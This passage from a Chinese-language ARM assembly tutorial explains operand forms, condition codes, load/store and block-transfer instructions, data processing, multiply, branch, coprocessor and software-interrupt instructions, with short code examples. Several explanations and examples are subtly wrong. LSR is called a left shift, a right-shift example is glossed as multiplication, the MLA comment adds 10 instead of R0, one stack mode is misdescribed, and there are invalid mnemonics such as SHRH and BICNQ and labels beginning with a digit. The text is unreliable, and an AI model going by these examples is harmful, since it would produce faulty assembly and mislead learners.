;跳转指令，执行条件EQ，即相等跳转到DATAEVEN​ ADDS R1,R1,#1 ;加法指令，R1＋1＝R1 影响CPSR 寄存器，带有S​ SUBNES R1,R1,#0xD;条件执行减法运算(NE)，R1-0xD=&gt;R1，影响CPSR 寄存器，带有S 2) 第2个操作数 ​ 在ARM 指令中，灵活的使用第2个操作数能提高代码效率，第2个操作数的形式如下： ​ ＃immed_8r ​ 常数表达式： ​ 该常数必须对应8 位位图，即常数是由一个8 位的常数循环移位偶数位得到。 ​ 合法常量： ​ 0x3FC、0、0xF0000000、200、0xF0000001等都是合法常量。 ​ 非法常量： ​ 0x1FE、511、0xFFFF、0x1010、0xF0000010等都是非法常量。 ​ 常数表达式应用举例如下： ​ MOV R0,#1 ;R0=1 ​ AND R1,R2,#0x0F ;R2 与0x0F，结果保存在R1 ​ LDR R0，[R1],#-4 ;读取R1 地址上的存储器单元内容，且R1＝R1－4 ​ Rm ​ 寄存器方式，在寄存器方式下操作数即为寄存器的数值。 ​ 寄存器方式应用举例： ​ SUB R1，R1，R2 ；R1-R2=＞R1 ​ MOV PC，R0 ；PC=R0，程序跳转到指定地址 ​ LDR R0，[R1]，-R2 ；读取R1 地址上的存储器单元内容并存入R0，且R1=R1-R2 ​ Rm， shift ​ 寄存器移位方式。将寄存器的移位结果作为操作数，但RM 值保存不变，移位方法如下： ​ ASR #n 算术右移n 位（1≤n≤32） ​ LSL #n 逻辑左移n 位（1≤n≤31） ​ LSR #n 逻辑左移n 位（1≤n≤32） ​ ROR #n 循环右移n 位（1≤n≤31） ​ RRX 带扩展的循环右移1位 ​ type Rs 其中，type 为ASR，LSL，和ROR 中的一种；Rs 偏移量寄存器，低8位有效，若其值大于或等于32，则第2 个操作数的结果为0（ASR、ROR例外）。​ 寄存器偏移方式应用举例： ​ ADD R1，R1，R1，LSL #3 ；R1=R1*9 ​ SUB R1，R1，R2，LSR#2 ；R1=R1-R2*4 ​ R15 为处理器的程序计数器PC，一般不要对其进行操作，而且有些指令是不允许使用R15，如UMULL 指令。​ （3）条件码​ 使用指令条件码，可实现高效的逻辑操作，提高代码效率。表A-1给出条件码表。 表A-1 条件码表 ​ 对于Thumb指令集，只有B 指令具有条件码执行功能，此指令条件码同表A-?，但如果为无条件执行时，条件码助记符“AL”不在指令中书写。 ​ 条件码应用举例如下： ​ 比较两个值大小，并进行相应加1 处理，C 代码为：​ if（a＞b）a++ ;​ else b++ ;​ 对应的ARM 指令如下。其中R0为a，R1为b。​ CMP R0，R1 ; R0 与R1 比较​ ADDHI R0，R0，#1 ; 若R0＞R1，则R0=R0+1​ ADDLS R1，R1，#1 ;若R0＜=R1，则R1=R1+1​ 若两个条件均成立，则将这两个数值相加，C代码为： ​ If(（a!=10）&amp;&amp;(b!=20))a=a+b; ​ 对应的ARM 指令如下，其中R0 为a，R1为b。​ CMP R0,#10 ; 比较R0 是否为10​ CMPNE R1,#20 ; 若R0 不为10，则比较R1 是否20​ ADDNE R0,R0,R1 ; 若R0 不为10 且R1 不为20，指令执行，R0=R0+R1 1.3. 指令集1.3.1. ARM 存储器访问指令​ ARM 处理是加载/存储体系结构的典型的RISC处理器，对存储器的访问只能使用加载和存储指令实现。ARM 的加载/存储指令是可以实现字、半字、无符/有符字节操作；批量加载/存储指令可实现一条指令加载/存储多个寄存器的内容，大大提高效率；SWP指令是一条寄存器和存储器内容交换的指令，可用于信号量操作等。ARM 处理器是冯?诺依曼存储结构，程序空间、RAM 空间及IO 映射空间统一编址，除对对RAM 操作以外，对外围IO、程序数据的访问均要通过加载/存储指令进行。表A-2给出ARM存储访问指令表。 表A-2 ARM 存储访问指令表 LDR 和STR​ 加载/存储字和无符号字节指令。使用单一数据传送指令(STR 和LDR)来装载和存储单一字节或字的数据从/到内存。LDR指令用于从内存中读取数据放入寄存器中；STR 指令用于将寄存器中的数据保存到内存。指令格式如下：​ LDR{cond}{T} Rd,&lt;地址&gt;; 加载指定地址上的数据(字)，放入Rd中​ STR{cond}{T} Rd,&lt;地址&gt;; 存储数据(字)到指定地址的存储单元，要存储的数据在Rd中​ LDR{cond}B{T} Rd,&lt;地址&gt;; 加载字节数据，放入Rd中，即Rd最低字节有效，高24位清零​ STR{cond}B{T} Rd,&lt;地址&gt;; 存储字节数据，要存储的数据在Rd，最低字节有效​ 其中，T 为可选后缀，若指令有T，那么即使处理器是在特权模式下，存储系统也将访问看成是处理器是在用户模式下。T在用户模式下无效，不能与前索引偏移一起使用T。​ LDR/STR 指令寻址是非常灵活的，由两部分组成，一部分为一个基址寄存器，可以为任一个通用寄存器，另一部分为一个地址偏移量。地址偏移量有以下3种格式：​ (1) 立即数。立即数可以是一个无符号数值，这个数据可以加到基址寄存器，也可以从基址寄存器中减去这个数值。指令举例如下：​ LDR R1,[R0,#0x12] ;将R0+0x12 地址处的数据读出，保存到R1中(R0 的值不变)​ LDR R1,[R0,#-0x12];将R0-0x12 地址处的数据读出，保存到R1中(R0 的值不变)​ LDR R1,[R0] ;将R0 地址处的数据读出，保存到R1 中(零偏移)​ (2)寄存器。寄存器中的数值可以加到基址寄存器，也可以从基址寄存器中减去这个数值。指令举例值。指令举例如下：​ LDR R1,[R0,R2] ;将R0+R2 地址的数据计读出，保存到R1中(R0 的值不变)​ LDR R1,[R0,-R2] ;将R0-R2 地址处的数据计读出，保存到R1中(R0 的值不变)​ (3)寄存器及移位常数。寄存器移位后的值可以加到基址寄存器，也可以从基址寄存器中减去这个数值。指令举例如下：​ LDR R1,[R0,R2,LSL #2] ;将R0+R24地址处的数据读出，保存到R1中（R0，R2的值不变）​ LDR R1,[R0,-R2,LSL #2];将R0-R24地址处的数据计读出，保存到R1中(R0，R2的值不变)​ 从寻址方式的地址计算方法分，加载/存储指令有以下4 种形式：​ (1)零偏移。Rn 的值作为传送数据的地址，即地址偏移量为0。指令举例如下：​ LDR Rd,[Rn]​ (2)前索引偏移。在数据传送之前，将偏移量加到Rn 中，其结果作为传送数据的存储地址。若使用后缀“！”，则结果写回到Rn中，且Rn 值不允许为R15。指令举例如下：​ LDR Rd,[Rn,#0x04]!​ LDR Rd,[Rn,#-0x04]​ (3)程序相对偏移。程序相对偏移是索引形式的另一个版本。汇编器由PC 寄存器计算偏移量，并将PC寄存器作为Rn 生成前索引指令。不能使用后缀“！”。指令举例如下：​ LDR Rd,label ;label 为程序标号，label 必须是在当前指令的±4KB范围内​ (4) 后索引偏移。Rn 的值用做传送数据的存储地址。在数据传送后，将偏移量与Rn相加，结果写回到Rn中。Rn 不允许是R15。指令举例如下：​ LDR Rd,[Rn],#0x04​ 地址对准–大多数情况下，必须保证用于32 位传送的地址是32 位对准的。​ 加载/存储字和无符号字节指令举例如下：​ LDR R2,[R5] ;加载R5 指定地址上的数据(字)，放入R2 中​ STR R1,[R0,#0x04] ;将R1 的数据存储到R0+0x04存储单元，R0 值不变​ LDRB R3,[R2],#1 ;读取R2 地址上的一字节数据，并保存到R3中，R2=R3+1​ STRB R6,[R7] ;读R6 的数据保存到R7 指定的地址中，只存储一字节数据​ 加载/存储半字和带符号字节。这类LDR/STR 指令可能加载带符字节\加载带符号半字、加载/存储无符号半字。偏移量格式、寻址方式与加载/存储字和无符号字节指令相同。指令格式如下：​ LDR{cond}SB Rd,&lt;地址&gt; ;加载指定地址上的数据(带符号字节)，放入Rd中​ LDR{cond}SH Rd,&lt;地址&gt; ;加载指定地址上的数据(带符号字节)，放入Rd中​ LDR{cond}H Rd,&lt;地址&gt; ;加载半字数据，放入Rd中，即Rd最低16位有效,高16位清零​ STR{cond}H Rd,&lt;地址&gt; ;存储半字数据，要存储的数据在Rd，最低16位有效​ 说明：带符号位半字/字节加载是指带符号位加载扩展到32 位;无符号位半字加载是指零扩展到32位。​ 地址对准–对半字传送的地址必须为偶数。非半字对准的半字加载将使Rd 内容不可靠，非半字对准的半字存储将使指定地址的2字节存储内容不可靠。 ​ 加载/存储半字和带符号字节指令举例如下： ​ LDRSB R1[R0,R3] ;将R0+R3地址上的字节数据读出到R1，高24 位用符号位扩展​ LDRSH R1,[R9] ;将R9 地址上的半字数据读出到R1，高16位用符号位扩展​ LDRH R6,[R2],#2 ;将R2 地址上的半字数据读出到R6，高16位用零扩展，R2=R2+1​ SHRH R1,[R0,#2]!;将R1 的数据保存到R2+2 地址中，只存储低2字节数据，R0=R0+2​ LDR/STR 指令用于对内存变量的访问，内存缓冲区数据的访问、查表、外设的控制操作等等，若使用LDR 指令加载数据到PC 寄存器，则实现程序跳转功能，这样也就实现了程序散转。​ 变量的访问​ NumCount EQU 0x40003000 ;定义变量NumCount​ …​ LDR R0,=NumCount ;使用LDR 伪指令装载NumCount的地址到R0​ LDR R1,[R0] ;取出变量值​ ADD R1,R1,#1 ;NumCount=NumCount+1​ STR R1,[R0] ;保存变量值​ …​ GPIO 设置​ GPIO-BASE EQU 0Xe0028000 ;定义GPIO 寄存器的基地址​ …​ LDR R0,=GPIO-BASE​ LDR R1,=0x00FFFF00 ;装载32 位立即数，即设置值​ STR R1,[R0,#0x0C] ;IODIR=0x00FFFF00， IODIR 的地址为0xE002800C​ MOV R1,#0x00F00000​ STR R1,[R0,#0x04] ;IOSET=0x00F00000，IOSET 的地址为0xE0028004​ …​ 程序散转​ …​ MOV R2,R2,LSL #2 ;功能号乘上4，以便查表​ LDR PC,[PC,R2] ;查表取得对应功能子程序地址，并跳转​ NOP​ FUN-TAB DCD FUN-SUB0​ DCD FUN-SUB1​ DCD FUN-SUB2​ … LDM和STM​ 批量加载/存储指令可以实现在一组寄存器和一块连续的内存单元之间传输数据。LDM为加载多个寄存器，STM 为存储多个寄存器。允许一条指令传送16 个寄存器的任何子集或所有寄存器。指令格式如下：​ LDM{cond}&lt;模式&gt; Rn{!},reglist{^}​ STM{cond}&lt;模式&gt; Rn{!},reglist{^}​ LDM /STM 的主要用途是现场保护、数据复制、参数传送等。其模式有8种，如下所列：(前面4 种用于数据块的传输，后面4 种是堆栈操作)。​ (1) IA：每次传送后地址加4​ (2) IB：每次传送前地址加4​ (3) DA：每次传送后地址减4​ (4) DB：每次传送前地址减4​ (5) FD：满递减堆栈​ (6) ED：空递增堆栈​ (7) FA：满递增堆栈​ (8) EA：空递增堆栈​ 其中，寄存器Rn 为基址寄存器，装有传送数据的初始地址，Rn 不允许为R15;后缀“！”表示最后的地址写回到Rn中;寄存器列表reglist 可包含多于一个寄存器或寄存器范围，使用“,”分开，如{R1,R2,R6-R9},寄存器排列由小到大排列；“＾”后缀不允许在用户模式呈系统模式下使用，若在LDM 指令用寄存器列表中包含有PC 时使用，那么除了正常的多寄存器传送外，将SPSR 拷贝到CPSR 中，这可用于异常处理返回；使用“＾”后缀进行数据传送且寄存器列表不包含PC时，加载/存储的是用户模式的寄存器，而不是当前模式的寄存器。​ 地址对准――这些指令忽略地址的位[1：0]。​ 批量加载/存储指令举例如下：​ LDMIA R0!,{R3-R9} ;加载R0 指向的地址上的多字数据，保存到R3～R9中，R0 值更新​ STMIA R1!,{R3-R9} ;将R3～R9 的数据存储到R1 指向的地址上，R1值更新​ STMFD SP!,{R0-R7,LR} ;现场保存，将R0～R7、LR入栈​ LDMFD SP!,{R0-R7,PC}^;恢复现场，异常处理返回​ 在进行数据复制时，先设置好源数据指针，然后使用块拷贝寻址指令LDMIA/STMIA、LDMIB/STMIB、LDMDA/STMDA、LDMDB/STMDB 进行读取和存储。而进行堆栈操作时，则要先设置堆栈指针，一般使用SP 然后使用堆栈寻址指令STMFD/LDMFD、STMED。LDMED、STMFA/LDMFA、STMEA/LDMEA实现堆栈操作。​ 多寄存器传送指令示意图如图A-1所示，其中R1为指令执行前的基址寄存器，R1’则为指令执行完后的基址寄存器。 （a）指令STMIA R1!,{R5-R7} （b）指令STMIB R1!,{R5-R7} （c）指令STMDA R1!, {R5-R7} （d）指令STMDB R1!,{R5-R7}图A-1 多寄存器传送指令示意图 ​ 数据是存储在基址寄存器的地址之上还是之下，地址是在存储第一个值之前还是之后增加还是减少。表A-3给出多寄存器传送指令映射示意表。 表A-3 多寄存器传送指令映射示意表 123456使用LDM/STM 进行数据复制例程如下：…LDR R0,=SrcData ;//设置源数据地址LDR R1,=DstData ;//设置目标地址LDMIA R0,&#123;R2-R9&#125; ;//加载8 字数据到寄存器R2～R9STMIA R1,&#123;R2-R9&#125; ;//存储寄存器R2～R9 到目标地址 ​ 使用LDM/STM 进行现场寄存器保护，常在子程序中或异常处理使用：​ SENDBYTE​ STMFD SP!,{R0-R7,LR} ;寄存器入堆​ …​ BL DELAY ;调用DELAY 子程序​ …​ LDMFD SP!,{R0-R7,PC} ;恢复寄存器，并返回 SWP​ 寄存器和存储器交换指令。SWP指令用于将一个内存单元（该单元地址放在寄存器Rn中）的内容读取到一个寄存器Rd中，同时将另一个寄存器Rm 的内容写入到该内存单元中。使用SWP 可实现信号量操作。​ 指令格式如下：​ SWP{cond}{B} Rd,Rm,[Rn]​ 其中，B 为可选后缀，若有B，则交换字节，否则交换32 位字：Rd 为数据从存储器加载到的寄存器;Rm的数据用于存储到存储器中，若Rm 与Rn 相同，则为寄存器与存储器内容进行交换;Rn 为要进行数据交换的存储器地址，Rn 不能与Rd 和Rm 相同。​ SWP 指令举例如下：​ SWP R1,R1,[R0] ; 将R1 的内容与R0 指向的存储单元的内容进行交换​ SWP R1,R2,,[R0] ; 将R0 指向的存储单元内容读取一字节数据到R1中(高24 位清零)​ ; 并将R2 的内容写入到该内存单元中(最低字节有效)​ 使用SWP 指令可以方便地进行信号量的操作：​ 12C_SEM EQU 0x40003000​ …​ 12C_SEM_WAIT​ MOV R0,#0​ LDR R0,=12C_SEM​ SWP R1,R1,[R0] ;取出信号量，并设置其为0​ CMP R1,#0 ;判断是否有信号​ BEQ 12C_SEM_WAIT ;若没有信号，则等待 1.3.2. ARM 数据处理指令​ 数据处理指令大致可分为3 类： （1） 数据传送指令（如MOV、MVN） （2） 算术逻辑运算指令（如ADD,SUM,AND） （3） 比较指令（如CMP、TST）。 数据处理指令只能对寄存器的内容进行操作。 所有ARM 数据处理指令均可选择使用S 后缀，以影响状态标志。比较指令CMP、CMN、TST和TEQ不需要后缀S，它们会直接影响状态标志。ARM数据处理指令列于表A-4中。 表A-4 ARM 数据处理指令 123456789 （1）数据传送指令**MOV** 数据传送指令。将8 位图立即数或寄存器(operant2)传送到目标寄存器Rd，可用于移位运算等操作。指令格式如下： MOV&#123;cond&#125;&#123;S&#125; Rd,operand2 MOV 指令举例如下： MOV R1#0x10 ;R1=0x10 MOV R0,R1 ;R0=R1 MOVS R3,R1,LSL #2 ;R3=R1＜＜2，并影响标志位 MOV PC,LR ;PC=LR ，子程序返回 MVN​ 数据非传送指令。将8 位图立即数或寄存器(operand2)按位取反后传送到目标寄存器(Rd)，因为其具有取反功能，所以可以装载范围更广的立即数。指令格式如下：​ MVN{cond}{S} Rd,operand2​ MVN 指令举例如下：​ MVN R1,#0xFF ;R1=0xFFFFFF00​ MVN R1,R2 ;将R2 取反，结果存到R1 ​ （2）算术逻辑运算指令 ADD​ 加法运算指令。将operand2 数据与Rn 的值相加，结果保存到Rd 寄存器。指令格式如下：​ ADD{cond}{S} Rd,Rn,operand2​ ADD 指令举例如下：​ ADDS R1,R1,#1 ;R1=R1+1​ ADD R1,R1,R2 ;R1=R1+R2​ ADDS R3,R1,R2,LSL #2 ;R3=R1+R2＜＜2 SUB​ 减法运算指令。用寄存器Rn 减去operand2。结果保存到Rd 中。指令格式如下：​ SUB{cond}{S} Rd,Rn,operand2​ SUB 指令举例如下：​ SUBS R0,R0,#1 ;R0=R0-1​ SUBS R2,R1,R2 ;R2=R1-R2​ SUB R6,R7,#0x10 ;R6=R7-0x10 RSB​ 逆向减法指令。用寄存器operand2 减法Rn，结果保存到Rd 中。指令格式如下：​ RSB{cond}{S} Rd,Rn,operand2​ SUB 指令举例如下：​ RSB R3,R1,#0xFF00 ;R3=0xFF00-R1​ RSBS R1,R2,R2,LSL #2 ;R1=R2＜＜2-R2=R2×3​ RSB R0,R1,#0 ;R0=-R1 ADC​ 带进位加法指令。将operand2 的数据与Rn 的值相加，再加上CPSR中的C 条件标志位。结果保存到Rd 寄存器。指令格式如下：​ ADC{cond}{S} Rd,Rn,operand2​ ADC 指令举例如下：​ ADDS R0,R0,R2​ ADC R1,R1,R3 ;使用ADC 实现64 位加法，(R1、R0)=(R1、R0)+（R3、R2） SBC​ 带进位减法指令。用寄存器Rn 减去operand2，再减去CPSR 中的C条件标志位的非（即若C 标志清零，则结果减去1），结果保存到Rd 中。指令格式如下：​ SCB{cond}{S}Rd,Rn,operand2​ SBC 指令举例如下：​ SUBS R0，R0，R2​ SBC R1，R1，R3 ;使用SBC 实现64 位减法，(R1,R0)-(R3,R2) RSC​ 带进位逆向减法指令。用寄存器operand2 减去Rn，再减去CPSR 中的C条件标志位，结果保存到Rd 中。指令格式如下：​ RSC{cond}{S} Rd,Rn,operand2​ RSC 指令举例如下：​ RSBS R2,R0,#0​ RSC R3,R1,#0 ;使用RSC 指令实现求64 位数值的负数 AND​ 逻辑与操作指令。将operand2 值与寄存器Rn 的值按位作逻辑与操作，结果保存到Rd中。指令格式如下：​ AND{cond}{S} Rd,Rn,operand2​ AND 指令举例如下：​ ANDS R0,R0,#x01 ;R0=R0&amp;0x01，取出最低位数据​ AND R2,R1,R3 ;R2=R1&amp;R3 ORR​ 逻辑或操作指令。将operand2 的值与寄存器Rn的值按位作逻辑或操作，结果保存到Rd 中。指令格式如下：​ ORR{cond}{S} Rd,Rn,operand2​ ORR 指令举例如下：​ ORR R0,R0,#x0F ;将R0 的低4 位置1​ MOV R1,R2,LSR #4​ ORR R3,R1,R3,LSL #8 ;使用ORR 指令将近R2 的高8位数据移入到R3 低8 位中 EOR​ 逻辑异或操作指令。将operand2 的值与寄存器Rn 的值按位作逻辑异或操作，结果保存到Rd中。指令格式如下：​ EOR{cond}{S}Rd,Rn,operand2​ EOR 指令举例如下：​ EOR R1,R1,#0x0F ;将R1 的低4 位取反​ EOR R2,R1,R0 ;R2=R1^R0​ EORS R0,R5,#0x01 ;将R5 和0x01 进行逻辑异或，结果保存到R0，并影响标志位 BIC​ 位清除指令。将寄存器Rn 的值与operand2 的值的反码按位作逻辑与操作，结果保存到Rd中。指令格式如下：​ BIC{cond}{S}Rd,Rn,operand2​ BIC 指令举例如下：​ BIC R1,R1,#0x0F ;将R1 的低4 位清零，其它位不变​ BIC R1,R2,R3 ;将拭的反码和R2 相逻辑与，结果保存到R1 ​ （3）比较指令 CMP​ 比较指令。指令使用寄存器Rn 的值减去operand2 的值，根据操作的结果更新CPSR中的相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行。指令格式如下：​ CMP{cond} Rn,operand2​ CMP 指令举例如下：​ CMP R1,#10 ;R1 与10 比较，设置相关标志位​ CMP R1,R2 ;R1 与R2 比较，设置相关标志位​ CMP 指令与SUBS 指令的区别在于CMP 指令不保存运算结果。在进行两个数据大小判断时，常用CMP指令及相应的条件码来操作。 CMN​ 负数比较指令。指令使用寄存器Rn 与值加上operand2 的值，根据操作的结果更新CPSR中的相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行，指令格式如下：​ CMN{cond} Rn,operand2​ CMN R0,#1 ;R0+1,判断R0 是否为1 的补码，若是Z 置位​ CMN 指令与ADDS 指令的区别在于CMN 指令不保存运算结果。CMN指令可用于负数比较，比如CMNR0，#1 指令则表示R0 与-1 比较，若R0 为-(即1 的补码)，则Z 置位，否则Z复位。 TST​ 位测试指令。指令将寄存器Rn 的值与operand2 的值按位作逻辑与操作，根据操作的结果更新CPSR中相应的条件标志位(当结果为0时，EQ位被设置)，以便后面指令根据相应的条件标志来判断是否执行。指令格式如下：​ TST{cond} Rn,operand2​ TST 指令举例如下：​ TST R0,#0x01 ;判断R0 的最低位是否为0​ TST R1,#0x0F ;判断R1 的低4 位是否为0​ TST 指令与ANDS 指令的区别在于TST4 指令不保存运算结果。TST指令通常于EQ、NE条件码配合使用，当所有测试位均为0 时，EQ 有效，而只要有一个测试为不为0，则NE 有效。 TEQ​ 相等测试指令。指令寄存器Rn 的值与operand2 的值按位作逻辑异或操作，根据操作的结果更新CPSR中相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行。指令格式如下：​ TEQ{cond} Rn,operand2​ TEQ 指令举例如下：​ TEQ R0,R1 ;比较R0 与R1 是否相等(不影响V 位和C 位)​ TST 指令与EORS 指令的区别在于TST 指令不保存运算结果。使用TEQ进行相等测试，常与EQNE 条件码配合使用，当两个数据相等时，EQ 有效，否则NE 有效。 （4）乘法指令​ ARM7TDMI(-S)具有32×32 乘法指令、32×32 乘加指令、32×32结果为64 位的乘法指令。表A-5给出全部的ARM 乘法指令。 表A-5 全部的ARM 乘法指令 MUL1234532 位乘法指令。指令将Rm 和Rs 中的值相乘，结果的低32 位保存到Rd中。指令格式如下：MUL&#123;cond&#125;&#123;S&#125; Rd,Rm,RsMUL 指令举例如下：MUL R1,R2,R3 ;R1=R2×R3MULS R0,R3,R7 ;R0=R3×R7，同时设置CPSR 中的N位和Z 位 MLA​ 32 位乘加指令。指令将Rm 和Rs 中的值相乘，再将乘积加上第3 个操作数，结果的低32位保存到Rd 中。指令格式如下：​ MLA{cond}{S} Rd,Rm,Rs,Rn​ MLA 指令举例如下：​ MLA R1,R2,R3,R0 ;R1=R2×R3+10 UMULL​ 64 位无符号乘法指令。指令将Rm 和Rs 中的值作无符号数相乘，结果的低32位保存到RsLo 中，而高32 位保存到RdHi 中。指令格式如下：​ UMULL{cond}{S} RdLo,RdHi,Rm,Rs​ UMULL 指令举例如下：​ UMULL R0,R1,R5,R8 ;(R1、R0)=R5×R8 UMLAL​ 64 位无符号乘加指令。指令将Rm 和Rs 中的值作无符号数相乘，64 位乘积与RdHi、RdLo相加，结果的低32 位保存到RdLo 中，而高32 位保存到RdHi 中。指令格式如下：​ UMLAL{cond}{S} RdLo,RdHi,Rm,Rs​ UMLAL 指令举例如下：​ UMLAL R0,R1,R5,R8;(R1,R0)=R5×R8+(R1,R0) SMULL​ 64 位有符号乘法指令。指令将Rm 和Rs 中的值作有符号数相乘，结果的低32位保存到RdLo 中，而高32 位保存到RdHi 中。指令格式如下：​ SMULL{cond}{S} RdLo,RdHi,Rm,Rs​ SMULL 指令举例如下：​ SMULL R2,R3,R7,R6 ;(R3,R2)=R7×R6 SMLAL​ 64 位有符号乘加指令。指令将Rm 和Rs 中的值作有符号数相乘，64 位乘积与RdHi、RdLo，相加，结果的低32位保存到RdLo 中，而高32 位保存到RdHi 中。指令格式如下：​ SMLAL{cond}{S} RdLo,RdHi,Rm,Rs​ SMLAL 指令举例如下：​ SMLAL R2,R3,R7,R6;(R3,R2)=R7×R6+(R3,R2) 1.3.3. ARM 跳转指令​ 两种方式可以实现程序的跳转： （1） 使用跳转指令直接跳转，跳转指令有跳转指令B，带链接的跳转指令BL ，带状态切换的跳转指令BX。 （2） 直接向PC 寄存器赋值实现跳转。 表A-6给出全部的ARM跳转指令。 表A-6 ARM跳转指令 B​ 跳转指令，跳转到指定的地址执行程序。 `B{cond} label` 举例如下： ​ B WAITA ;跳转到WAITA 标号处 ​ B 0x1234 ;跳转到绝对地址0x1234 处 ​ 跳转到指令B 限制在当前指令的±32Mb 的范围内。 BL带链接的跳转指令。指令将下一条指令的地址拷贝到R14(即LR)链接寄存器中，然后跳转到指定地址运行程序。 ​ BL{cond} label ​ 举例如下： ​ BL DELAY ​ 跳转指令B 限制在当前指令的±32MB 的范围内。BL 指令用于子程序调用。 BX带状态切换的跳转指令。跳转到Rm 指定的地址执行程序，若Rm 的位[0]为1，则跳转时自动将CPSR 中的标志T 置位，即把目标地址的代码解释为Thumb代码;若Rm 的位[0]为0，则跳转时自动将CPSR 中的标志T 复位，即把目标地址的代码解释为ARM代码。指令格式如下：​ BX{cond} Rm​ 举例如下：​ ADRL R0,ThumbFun+1​ BX R0 ;跳转到R0 指定的地址，并根据R0 的最低位来切换处理器状态 BLX​ BLX目标地址：跳转，改变状态及保存PC值 1.3.4. ARM 协处理器指令5 ARM 支持协处理器操作，协处理器的控制要通过协处理器命令实现。表A-7给出全部的ARM协处理器指令。 表A-7 ARM 协处理器指令 CDP​ 协处理器数据操作指令。ARM 处理器通过CDP 指令通知ARM 协处理器执行特定的操作。该操作由协处理器完成，即对命令的参数的解释与协处理器有关，指令的使用取决于协处理器。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下：​ CDP{cond}coproc,opcodel,CRd,CRn,CRm{,opcode2}​ 其中： coproc 指令操作的协处理器名。标准名为pn,n 为0～15。​ opcodel 协处理器的特定操作码。​ CRd 作为目标寄存器的协处理器寄存器。​ CRN 存放第1 个操作数的协处理器寄存器。​ CRm 存放第2 个操作数的协处理器寄存器。​ Opcode2 可选的协处理器特定操作码。​ CDP 指令举例如下：​ CDP p7,0,c0,c2,c3,0 ;协处理器7 操作，操作码为0，可选操作码为0​ CDP p6,1,c3,c4,c5 ;协处理器操作，操作码为1 LDC​ 协处理器数据读取指令。LDC指令从某一连续的内存单元将数据读取到协处理器的寄存器中。协处理器数据的数据的传送，由协处理器来控传送的字数。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下：​ LDC{cond}{L} coproc,CRd,&lt;地址&gt;​ 其中： L 可选后缀，指明是长整数传送。​ coproc 指令操作的协处理器名。标准名为pn，n 为0～15​ CRd 作为目标寄存的协处理器寄存器。​ &lt;地址&gt; 指定的内存地址​ LDC 指令举例如下：​ LDC p5,c2,[R2,#4];读取R2+4指向的内存单元的数据，传送到协处理器p5的c2寄存器中​ LDC p6,c2,[R1] ;读取是指向的内存单元的数据，传送到协处理器p6的c2 寄存器中 STC​ 协处理器数据写入指令。STC指令将协处理器的寄存器数据写入到某一连续的内存单元中。进行协处理器数据的数据传送，由协处理器来控制传送的字数。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下：​ STC{cond}{L} coproc,CRd,&lt;地址&gt;​ 其中： L 可选后缀，指明是长整数传送。​ coproc 指令操作的协处理器名。标准名为pn，n 为0～15​ CRd 作为目标寄存的协处理器寄存器。​ &lt;地址&gt; 指定的内存地址​ STC 指令举例如下：​ STC p5,c1,[R0]​ STC p5,c1,[Ro,#-0x04] MCR​ ARM寄存器到协处理器寄存器的数据传送指令。MCR 指令将ARM 处理器的寄存器中的数据传送到协处理器的寄存器中。若协处理器不能成功地执行该操作，将产生未定义指令异常中断。指令格式如下：​ MCR{cond}coproc,opcodel,Rd,CRn,CRm{,opcode2}​ 其中：coproc 指令操作的协处理器名。标准名为pn，n 为0～15。​ cpcodel 协处理器的特定操作码。​ RD 作为目标寄存器。​ CRn 存放第1 个操作数的协处理器寄存器​ CRm 存放第2 个操作数的协处理器寄存器。​ Opcode2 可选的协处理器特定操作码。​ MCR 指令举例如下：​ MCR p6,2,R7,c1,c2,​ MCR P7,0,R1,c3,c2,1, MRC​ 协处理器寄存器到ARM寄存器到的数据传送指令。MRC 指令将协处理器寄存器中的数据传送到ARM 处理器的寄存器中。若协处理器不能成功地执行该操作。将产生未定义异常中断。指令格式如下：​ MRC {cond}coproc,opcodel,Rd,CRn,CRm{,opcode2}​ 其中：coproc 指令操作的协处理器名。标准名为pn，n为0～15。​ opcodel 协处理器的特定操作码。​ Rd 作为目标寄存器。​ CRn 存放第1 个操作数的协处理器寄存器。​ CRm 存放第2 个操作数的协处理器寄存器。​ opcode2 可选的协处理器特定操作码。​ MRC 指令举例如下：​ MRC p5,2,R2,c3,c2​ MRC p7,0,R0,c1,c2,1 1.3.5. ARM 杂项指令​ 表A-8给出全部的ARM协处理器指令。 表A-8 ARM杂项指令 SWI ​ 软中断指令。SWI 指令用于产生软中断，从而实现在用户模式变换到管理模式，CPSR保存到管理模式的SPSR中，执行转移到SWI 向量，在其它模式下也可使用SWI 指令，处理同样地切换到管理模式。指令格式如下：​ SWI{cond} immed_24​ 其中：immed_24 24 位立即数，值为0～16777215 之间的整数。​ SWI 指令举例如下：​ SWI 0 ;软中断，中断立即数为0​ SWI 0x123456 ;软中断，中断立即数为0x123456​ 使用SWI 指令时，通常使用以下两种方法进行传递参数，SWI 异常中断处理程序就可以提供相关的服务，这两种方法均是用户软件协定。SWI异常中断处理程序要通过读取引起软中断的SWI 指令，以取得24 位立即数。​ （A）指令24 位的立即数指定了用户请求的服务类型，参数通过用寄存器传递。​ MOV R0,#34 ;设置了功能号为34​ SWI 12 ;调用12 号软中断​ （B）指令中的24 位立即数被忽略，用户请求的服务类型由寄存器R0 的值决定，参数通过其它的通用寄存器传递。​ MOV R0,#12 ;调用12 号软中断​ MOV R1,#34 ;设置子功能号为34​ SWI 0 ;​ 在SWI 异常中断处理程序中，取出SWI 立即数的步骤为：首先确定引起软中断的SWI指令是ARM指令还时Thumb 指令，这可通过对SPSR 访问得到：然后要取得该SWI 指令的地址，这可通过访问LR 寄存器得到：接着读出指令，分解出立即数。​ 读出SWI 立即数：​ T_bit EQU 0x20​ SWI_Hander​ STMFD SP!,{R0_R3,R12,LR} ;现场保护​ MRS R0,SPSR ;读取SPSR​ STMFD SP!,{R0} ;保存SPSR​ TST R0,#T_bit ;测试T标志位​ LDRNEH R0,[LR,#-2] ;若是Thumb指令，读取指令码(16 位)​ BICNE R0,R0,#0xFF00 ;取得Thumb 指令的8 位立即数​ LDREQ R0,[LR,#-4] ;若是ARM 指令，读取指令码(32 位)​ BICNQ R0,R0,#0xFF00000 ;取得ARM 指令的24 位立即数​ …​ LDMFD SP!,{R0-R3,R12,PC}^ ;SWI 异常中断返回 MRS​ 读状态寄存器指令。在ARM 处理器中，只有MRS 指令可以状态寄存器CPSR或SPSR读出到通用寄存器中。指令格式如下：​ MRS{cond} Rd ,psr​ 其中： Rd 目标寄存器。Rd 不允许为R15。​ 